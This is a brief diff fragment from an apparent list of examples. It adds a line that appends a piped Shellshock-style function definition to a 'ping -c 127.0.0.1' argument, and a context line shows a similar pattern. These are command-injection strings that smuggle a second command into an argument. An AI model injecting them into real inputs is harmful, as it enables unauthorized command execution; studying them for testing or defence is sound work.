@@ -8,7 +8,7 @@ ping () { :; };{ echo #rekt; }
 
 Example 2:
 
-ping -c 
+ping -c 127.0.0.1|:() { :; };{ echo example; }
 
 Example 3: 
 
